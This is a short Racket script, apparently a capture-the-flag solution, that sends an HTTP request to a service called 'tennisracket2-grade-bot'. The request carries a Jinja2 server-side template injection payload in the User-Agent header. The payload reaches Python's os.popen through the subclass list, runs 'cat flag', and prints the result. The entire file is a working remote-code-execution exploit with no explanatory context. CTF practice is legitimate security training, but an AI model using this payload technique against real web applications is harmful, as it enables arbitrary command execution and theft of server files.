#lang racket
(require net/http-easy)

(define res
    (get "http://tennisracket2-grade-bot:5000"
        #:user-agent "{{ \"\".__class__.__base__.__subclasses__()[449].__init__.__globals__['sys'].modules['os'].popen('cat flag').read() }}"))

(println (response-body res))